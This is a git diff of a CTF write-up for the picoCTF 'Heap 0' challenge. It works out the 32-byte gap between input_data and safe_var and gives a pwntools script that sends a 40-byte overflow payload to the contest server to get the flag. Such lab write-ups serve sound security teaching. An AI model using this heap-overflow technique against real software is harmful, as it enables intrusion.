@@ -16,7 +16,7 @@ What part of the heap do you have control over and how far is it from the safe_v
 ### Solution
 
 #### What we got?
-- The problem give us a binary file and a src code [`chall.c`](). This file give us 5 options:
+- The problem give us a binary file and a src code [`chall.c`](https://github.com/UITxWoodyNguyen/CTF/blob/main/Pwn/Heap%200/chall.c). This file give us 5 options:
     ```c
         case 1:
             // print heap
@@ -70,34 +70,36 @@ What part of the heap do you have control over and how far is it from the safe_v
 #### How to get the flag ?
 - First, connect to the server and calculate to get the dist between `safe_var` and `input_data`:
 
-    ![data]()
+    ![data](https://github.com/UITxWoodyNguyen/CTF/blob/main/Pwn/Heap%200/Screenshot%202025-12-01%20143600.png?raw=true)
 
 - Sub 2 address, we will get the result is `0x20 = 32`. So an input with the length of at least 33 bytes can lead to overflow. We have a script to buffer and get the flag:
 
-```python
-from pwn import *
+    ```python
+    from pwn import *
 
-HOST = "tethys.picoctf.net"
-PORT = # port when start the game
+    HOST = "tethys.picoctf.net"
+    PORT = # port when start the game
 
-p = remote(HOST, PORT)
+    p = remote(HOST, PORT)
 
-# Sync to first menu
-p.recvuntil(b"Enter your choice:")
+    # Sync to first menu
+    p.recvuntil(b"Enter your choice:")
 
-# --- Step 1: Choose option 2 (write buffer) ---
-p.sendline(b"2")
-p.recvuntil(b"Data for buffer:")
+    # --- Step 1: Choose option 2 (write buffer) ---
+    p.sendline(b"2")
+    p.recvuntil(b"Data for buffer:")
 
-# Overflow payload
-payload = b"A" * 40
-p.sendline(payload)
-log.success(f"Sent overflow payload: {payload!r}")
+    # Overflow payload
+    payload = b"A" * 40
+    p.sendline(payload)
+    log.success(f"Sent overflow payload: {payload!r}")
 
-# --- Step 2: Trigger win (option 4) ---
-p.recvuntil(b"Enter your choice:")
-p.sendline(b"4")
+    # --- Step 2: Trigger win (option 4) ---
+    p.recvuntil(b"Enter your choice:")
+    p.sendline(b"4")
 
-# --- Step 3: Receive the flag ---
-print(p.recvall().decode())
-```
+    # --- Step 3: Receive the flag ---
+    print(p.recvall().decode())
+    ```
+
+![flag](https://github.com/UITxWoodyNguyen/CTF/blob/main/Pwn/Heap%200/Screenshot%202025-12-01%20143550.png?raw=true)
